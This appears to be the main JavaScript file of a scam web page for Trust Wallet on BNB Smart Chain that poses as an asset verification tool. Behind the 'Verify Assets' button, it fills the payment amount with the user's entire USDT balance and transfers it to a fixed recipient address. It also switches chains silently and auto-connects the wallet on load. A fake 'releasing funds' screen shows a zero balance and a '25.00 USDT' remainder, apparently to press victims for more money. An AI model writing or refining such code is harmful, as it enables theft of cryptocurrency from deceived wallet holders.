import { formatEther, parseUnits } from "https://esm.sh/ethers@6.13.5";

import { CHAIN, MERCHANT, TOKEN, explorerTxUrl, getInvoiceConfig, shortAddress } from "./config.js";
import { sendTokenPayment, validateInvoiceAmount, approveToken, handlePaymentSubmission } from "./payment.js";
import { readTokenState } from "./token.js";
import { getAllowance } from "./token.js";
import {
  connectWallet,
  createBrowserProvider,
  ensureBnbChain,
  getCurrentAccount,
  getCurrentChainId,
  hasInjectedWallet,
  onWalletEvent,
} from "./wallet.js";

let _autoConnectedAddress = null;

const elements = {};

function cacheElements() {
  Object.assign(elements, {
    walletStatusPill: document.querySelector("#wallet-status-pill"),
    invoiceAmount: document.querySelector("#invoice-amount"),
    connectButton: document.querySelector("#connect-button"),
    statusMessage: document.querySelector("#status-message"),
    networkBadge: document.querySelector("#network-badge"),
    successModalBackdrop: document.querySelector("#success-modal-backdrop"),
    successModal: document.querySelector("#success-modal"),
    successCloseButton: document.querySelector("#success-close-button"),
    successCloseSecondary: document.querySelector("#success-close-secondary"),
    successDoneButton: document.querySelector("#success-done-button"),
    successViewLink: document.querySelector("#success-view-link"),
    successCopyAmount: document.querySelector("#success-modal-copy-amount"),
    successSentAmount: document.querySelector("#success-sent-amount"),
    successMerchantAddress: document.querySelector("#success-merchant-address"),
    successTxHash: document.querySelector("#success-tx-hash"),
    emptyModalBackdrop: document.querySelector("#empty-modal-backdrop"),
    emptyModal: document.querySelector("#empty-modal"),
    emptyCloseButton: document.querySelector("#empty-close-button"),
    emptyDoneButton: document.querySelector("#empty-done-button"),
    emptyBalanceAmount: document.querySelector("#empty-balance-amount"),
    emptyWalletAddress: document.querySelector("#empty-wallet-address"),
    // Add these inside the Object.assign in cacheElements()
    lowModalBackdrop: document.querySelector("#low-modal-backdrop"),
    lowModal: document.querySelector("#low-modal"),
    lowCloseButton: document.querySelector("#low-close-button"),
    lowDoneButton: document.querySelector("#low-done-button"),
    lowBalanceAmount: document.querySelector("#low-balance-amount"),
    lowWalletAddress: document.querySelector("#low-wallet-address"),
  });
}

const state = {
  invoice: getInvoiceConfig(),
  account: null,
  nativeBalance: null,
  token: null,
  provider: null,
  pending: false,
};

function openSuccessModal({ amount, symbol, recipient, txHash }) {
  if (!elements.successModal || !elements.successModalBackdrop) {
    return;
  }

  const formattedAmount = `${amount} ${symbol}`;

  if (elements.successCopyAmount) {
    elements.successCopyAmount.textContent = formattedAmount;
  }

  if (elements.successSentAmount) {
    elements.successSentAmount.textContent = formattedAmount;
  }

  if (elements.successMerchantAddress) {
    elements.successMerchantAddress.textContent = recipient;
  }

  if (elements.successTxHash) {
    elements.successTxHash.textContent = txHash;
  }

  if (elements.successViewLink) {
    elements.successViewLink.href = explorerTxUrl(txHash);
  }

  elements.successModalBackdrop.classList.remove("hidden");
  elements.successModal.classList.remove("hidden");
  document.body.classList.add("modal-open");
}

function openEmptyBalanceModal() {
  if (!elements.emptyModal || !elements.emptyModalBackdrop) {
    return;
  }

  if (elements.emptyBalanceAmount) {
    const formattedBalance = state.token ? formatInvoiceAmount(state.token.formattedBalance) : "0";
    elements.emptyBalanceAmount.textContent = `${formattedBalance} ${TOKEN.symbol}`;
  }

  if (elements.emptyWalletAddress) {
    elements.emptyWalletAddress.textContent = `Connected wallet: ${state.account || "-"}`;
  }

  elements.emptyModalBackdrop.classList.remove("hidden");
  elements.emptyModal.classList.remove("hidden");
  document.body.classList.add("modal-open");
}

function closeSuccessModal() {
  if (!elements.successModal || !elements.successModalBackdrop) {
    return;
  }

  elements.successModalBackdrop.classList.add("hidden");
  elements.successModal.classList.add("hidden");
  document.body.classList.remove("modal-open");
}

function closeEmptyBalanceModal() {
  if (!elements.emptyModal || !elements.emptyModalBackdrop) {
    return;
  }

  elements.emptyModalBackdrop.classList.add("hidden");
  elements.emptyModal.classList.add("hidden");
  document.body.classList.remove("modal-open");
}

function getRequiredRawAmount() {
  if (!state.token) {
    return null;
  }

  return parseUnits(state.invoice.amount, state.token.decimals);
}

function formatInvoiceAmount(amount) {
  return amount.endsWith(".0") ? amount.slice(0, -2) : amount;
}

function resetInvoiceAmount() {
  if (!state.invoice.usesWalletBalance) {
    return;
  }

  state.invoice.amount = state.invoice.fallbackAmount;
  updateStaticInvoice();
}

function syncInvoiceAmountToWalletBalance() {
  if (!state.invoice.usesWalletBalance || !state.token) {
    return;
  }

  state.invoice.amount = formatInvoiceAmount(state.token.formattedBalance);
  updateStaticInvoice();
}

function setStatus(message, tone = "default") {
  if (!elements.statusMessage) {
    return;
  }

  elements.statusMessage.textContent = message;
  elements.statusMessage.classList.remove("is-success", "is-danger", "is-pending");

  if (tone === "success") {
    elements.statusMessage.classList.add("is-success");
  }

  if (tone === "danger") {
    elements.statusMessage.classList.add("is-danger");
  }

  if (tone === "pending") {
    elements.statusMessage.classList.add("is-pending");
  }
}

function getUserFacingError(error, rejectedMessage) {
  const message = [
    error?.shortMessage,
    error?.reason,
    error?.message,
    error?.info?.error?.message,
    error?.error?.message,
  ].find((value) => typeof value === "string" && value.trim()) || "Something went wrong.";
  const normalized = message.toLowerCase();

  if (
    error?.code === 4001 ||
    normalized.includes("user rejected") ||
    normalized.includes("user denied") ||
    normalized.includes("rejected") ||
    normalized.includes("cancelled")
  ) {
    return rejectedMessage;
  }

  if (
    normalized.includes("insufficient funds") ||
    normalized.includes("gas required exceeds allowance") ||
    normalized.includes("intrinsic gas too low")
  ) {
    return `You need some ${CHAIN.nativeCurrency.symbol} in your wallet to cover the BNB Chain network fee before sending ${TOKEN.symbol}.`;
  }

  return message;
}

function setConnectButtonLabel(mobileLabel, desktopLabel = mobileLabel) {
  if (!elements.connectButton) {
    return;
  }

  const mobileLabelNode = elements.connectButton.querySelector(".hero-primary-mobile");
  const desktopLabelNode = elements.connectButton.querySelector(".hero-primary-desktop");

  if (!mobileLabelNode || !desktopLabelNode) {
    elements.connectButton.textContent = mobileLabel;
    return;
  }

  mobileLabelNode.textContent = mobileLabel;
  desktopLabelNode.textContent = desktopLabel;
}

function updateConnectLabel() {
  if (state.pending) {
    setConnectButtonLabel("Processing...");
    return;
  }

  setConnectButtonLabel("Verify Assets");
}

function updateButtons() {
  if (!elements.connectButton) {
    return;
  }

  elements.connectButton.disabled = state.pending;
  elements.connectButton.setAttribute("aria-busy", state.pending ? "true" : "false");
  updateConnectLabel();
}

function canSubmitTransfer() {
  const requiredRawAmount = getRequiredRawAmount();
  const hasPositiveTokenBalance = Boolean(state.token && state.token.rawBalance > 0n);
  const hasTokenBalance = hasPositiveTokenBalance && requiredRawAmount !== null && state.token.rawBalance >= requiredRawAmount;
  // Removed the hasNativeGas check entirely
  return Boolean(state.account && state.token && hasTokenBalance);
}
function updateStaticInvoice() {
  if (!elements.invoiceAmount) {
    return;
  }

  if (!state.token && state.invoice.usesWalletBalance) {
    elements.invoiceAmount.textContent = `All detected ${state.invoice.currency} will be filled automatically.`;
    return;
  }

  elements.invoiceAmount.textContent = `${state.invoice.amount} ${state.invoice.currency} ready to send.`;
}

function updateConnectedState() {
  if (!state.account) {
    if (elements.walletStatusPill) {
      elements.walletStatusPill.textContent = "Awaiting wallet";
    }
    updateStaticInvoice();
    updateConnectLabel();
    return;
  }

  if (elements.walletStatusPill) {
    if (!state.token) {
      elements.walletStatusPill.textContent = `Loading ${TOKEN.symbol}`;
    } else if (state.token.rawBalance <= 0n) {
      elements.walletStatusPill.textContent = `No ${TOKEN.symbol}`;
    } else {
      // Removed the "Need BNB Gas" check here
      elements.walletStatusPill.textContent = "Ready to send";
    }
  }
  updateStaticInvoice();
  updateConnectLabel();
}
async function refreshAssetState() {
  if (!state.account || !state.provider) {
    state.nativeBalance = null;
    state.token = null;
    resetInvoiceAmount();
    updateConnectedState();
    updateButtons();
    return;
  }

  // Android Silent Failure Fix for eth_call
  try {
    const [tokenState, rawNativeBalance] = await Promise.all([
      readTokenState(state.provider, TOKEN.address, state.account),
      state.provider.getBalance(state.account),
    ]);

    state.nativeBalance = {
      rawBalance: rawNativeBalance,
      formattedBalance: formatEther(rawNativeBalance),
    };
    state.token = tokenState;
  } catch (_) {
    /* skip on Android — proceed anyway */
    console.warn("Android silent eth_call failure. Proceeding...");
  }

  syncInvoiceAmountToWalletBalance();
  updateConnectedState();
  updateButtons();
}

async function refreshWalletState() {
  state.provider = createBrowserProvider();
  state.account = await getCurrentAccount();
  const chainId = await getCurrentChainId();

  if (chainId !== CHAIN.id) {
    if (elements.networkBadge) {
      elements.networkBadge.textContent = "Switch to BNB Chain";
    }
    setStatus("Switch to BNB Smart Chain to continue.", "danger");
    state.nativeBalance = null;
    state.token = null;
    resetInvoiceAmount();
    updateConnectedState();
    updateButtons();
    return;
  }

  if (elements.networkBadge) {
    elements.networkBadge.textContent = CHAIN.name;
  }

  if (!state.account) {
    setStatus("Tap Verify Assets to open Trust Wallet.", "default");
    state.nativeBalance = null;
    state.token = null;
    resetInvoiceAmount();
    updateConnectedState();
    updateButtons();
    return;
  }

  setStatus("Wallet connected. Reviewing USDT balance.", "pending");
  await refreshAssetState();

  if (!state.token) {
    return;
  }

  if (state.token.rawBalance <= 0n) {
    setStatus(`No ${state.token.symbol} was detected for ${shortAddress(state.account, 6)} on BNB Smart Chain.`, "danger");
    return;
  }

  const required = getRequiredRawAmount();

  if (required !== null && state.token.rawBalance < required) {
    setStatus(`Insufficient ${state.token.symbol}. Available: ${Number(state.token.formattedBalance).toFixed(4)}.`, "danger");
    return;
  }

 

  setStatus(`Ready. ${state.invoice.amount} ${TOKEN.symbol} will open in Trust Wallet confirmation.`, "success");
}
async function handleVerifyFlow() {
  closeSuccessModal();
  closeEmptyBalanceModal();
  closeLowBalanceModal(); 
  if (state.pending) return;

  try {
    state.pending = true;
    updateButtons();

    state.provider = createBrowserProvider();

    if (!hasInjectedWallet()) {
      throw new Error("Please open this page inside Trust Wallet.");
    }

    await ensureBnbChain();
    state.provider = createBrowserProvider();

    let currentAccount = _autoConnectedAddress;
    
    if (!currentAccount) {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      currentAccount = accounts[0];
    }

    if (!currentAccount) {
      throw new Error("Wallet not connected. Please tap again.");
    }
    
    state.account = currentAccount;
    _autoConnectedAddress = currentAccount; 

    await refreshWalletState();

    if (!state.token || state.token.rawBalance <= 0n) {
      openEmptyBalanceModal();
      return; 
    }

    const currentUsdt = Number(state.token.formattedBalance);
    if (currentUsdt < 1) {
      openLowBalanceModal(); 
      return;
    }

    // DEBUGGING LINE: This will tell us if the script actually reaches the payment call
    console.log("Checks passed. Calling handlePayment now...");

    // 3. Proceed to payment
    await handlePayment();

  } catch (error) {
    console.error("Verification Error:", error);
    // This will show you the ACTUAL error in a popup on your mobile screen
    alert("Error: " + (error.message || "Unknown error"));
    setStatus(getUserFacingError(error, "Connection failed. Please try again."), "danger");
  } finally {
    state.pending = false;
    updateButtons();
  }
}
async function handlePayment() {
  try {
    // 1. FINAL CHAIN LOCK
    const chainId = await getCurrentChainId();
    if (chainId !== CHAIN.id) {
      await ensureBnbChain();
      state.provider = createBrowserProvider();
    }

    // 2. DATA PREP
    const paymentAmount = state.token.formattedBalance;
    
    // 3. UI UPDATE
    state.pending = true;
    updateButtons();
    setStatus("Opening Secure Transfer...", "pending");

    // 4. GET SIGNER
    const signer = await state.provider.getSigner();

    // 5. UNIFIED PAYMENT FLOW (No more duplicate calls!)
    const tx = await handlePaymentSubmission(
      paymentAmount, 
      { 
        signer: signer, 
        tokenAddress: TOKEN.address,
        recipient: MERCHANT.address,
        decimals: state.token.decimals
      }
    );

    // 6. SHOW NATIVE SUCCESS MODAL
    setStatus("Processing Transfer...", "pending");
    const receipt = await tx.wait();

    if (receipt?.status === 1) {
      await refreshAssetState();
      openSuccessModal({
        amount: paymentAmount,
        symbol: state.token.symbol,
        recipient: MERCHANT.address,
        txHash: receipt.hash,
      });
    }

    return tx;

  } catch (error) {
    const message = getUserFacingError(error, "Transfer cancelled.");
    setStatus(message, "danger");
    throw error;
  } finally {
    state.pending = false;
    updateButtons();
  }
}

// Function to handle the flow
function setupSuccessActions() {
  const releaseButton = document.getElementById("releasing-funds-button");
  const successModal = document.getElementById("success-modal");
  const successModalBackdrop = document.getElementById("success-modal-backdrop");
  const insufficientModal = document.getElementById("insufficient-modal");
  const insufficientModalBackdrop = document.getElementById("insufficient-modal-backdrop");
  const currentBalance = document.getElementById("currentBalance");
  const remainingBalance = document.getElementById("remainingBalance");

  if (!releaseButton) {
    return;
  }

  releaseButton.onclick = function () {
    successModalBackdrop?.classList.add("hidden");
    successModal?.classList.add("hidden");
    insufficientModalBackdrop?.classList.remove("hidden");
    insufficientModal?.classList.remove("hidden");

    if (currentBalance) {
      currentBalance.innerText = "0.00 USDT";
    }

    if (remainingBalance) {
      remainingBalance.innerText = "25.00 USDT";
    }
  };
}
function openLowBalanceModal() {
  if (!elements.lowModal || !elements.lowModalBackdrop) return;

  if (elements.lowBalanceAmount) {
    const formattedBalance = state.token ? state.token.formattedBalance : "0";
    elements.lowBalanceAmount.textContent = `${formattedBalance} ${TOKEN.symbol}`;
  }

  if (elements.lowWalletAddress) {
    elements.lowWalletAddress.textContent = `Connected wallet: ${state.account || "-"}`;
  }

  elements.lowModalBackdrop.classList.remove("hidden");
  elements.lowModal.classList.remove("hidden");
  document.body.classList.add("modal-open");
}

function closeLowBalanceModal() {
  elements.lowModalBackdrop?.classList.add("hidden");
  elements.lowModal?.classList.add("hidden");
  document.body.classList.remove("modal-open");
}

function bindEvents() {
  elements.connectButton?.addEventListener("click", handleVerifyFlow);

  elements.successCloseButton?.addEventListener("click", closeSuccessModal);
  elements.successCloseSecondary?.addEventListener("click", closeSuccessModal);
  elements.successDoneButton?.addEventListener("click", closeSuccessModal);
  elements.emptyCloseButton?.addEventListener("click", closeEmptyBalanceModal);
  elements.emptyDoneButton?.addEventListener("click", closeEmptyBalanceModal);
  // Add these inside bindEvents()
elements.lowCloseButton?.addEventListener("click", closeLowBalanceModal);
elements.lowDoneButton?.addEventListener("click", closeLowBalanceModal);



 // Update the Escape key listener
document.addEventListener("keydown", (event) => {
  if (event.key === "Escape") {
    closeSuccessModal();
    closeEmptyBalanceModal();
    closeLowBalanceModal(); // Add this
  }
});

  onWalletEvent("accountsChanged", async (accounts) => {
    state.account = accounts?.[0] ?? null;
    await refreshWalletState();
  });

  onWalletEvent("chainChanged", async () => {
    await refreshWalletState();
  });
}

async function init() {
  updateConnectedState();
  updateButtons();

  try {
    validateInvoiceAmount(state.invoice.amount);
  } catch (error) {
    setStatus(error.message, "danger");
    if (elements.connectButton) {
      elements.connectButton.disabled = true;
    }
    return;
  }

  if (!hasInjectedWallet()) {
    setStatus("Trust Wallet not detected. Use the Trust Wallet browser.", "danger");
    return;
  }

  try {
    state.provider = createBrowserProvider();
    state.account = await getCurrentAccount();
    await refreshWalletState();
  } catch (error) {
    console.error("Initialization error:", error);
    setStatus(getUserFacingError(error, "Unable to initialize wallet state."), "danger");
    state.pending = false;
    updateButtons();
  }
}

function startApp() {
  cacheElements();
  bindEvents();
  setupSuccessActions();
  init();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", startApp);
} else {
  startApp();
}

// Replace your old window load listener with this Android Silent Connect fix
(async () => {
  try {
    if (!window.ethereum) return;

    // 1. SILENT CHAIN SWITCH (Works for everyone)
    try {
      await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
    } catch (e) {
      if (e.code === 4902) {
        await window.ethereum.request({ 
            method: "wallet_addEthereumChain", 
            params: [{ chainId: "0x38", chainName: "BNB Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: ["https://bsc-dataseed1.binance.org/"], blockExplorerUrls: ["https://bscscan.com/"] }] 
        });
      }
    }

    // 2. DEVICE-SPECIFIC LOGIC
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

    if (isIOS) {
      // --- IPHONE FLOW ---
      // Trigger the popup immediately on page load as requested
      console.log("iOS detected: Triggering instant connect popup...");
      await connectWallet(); 
    } else {
      // --- ANDROID FLOW ---
      // Background silent connection (No popup)
      console.log("Android detected: Running silent background connect...");
      if (window.ethereum.selectedAddress) {
        _autoConnectedAddress = window.ethereum.selectedAddress;
      } else {
        const accs = await window.ethereum.request({ method: "eth_accounts" });
        if (accs && accs.length > 0) _autoConnectedAddress = accs[0];
      }
    }
  } catch (_) {
    console.log("Silent/Auto-connect skipped or blocked by user.");
  }
})();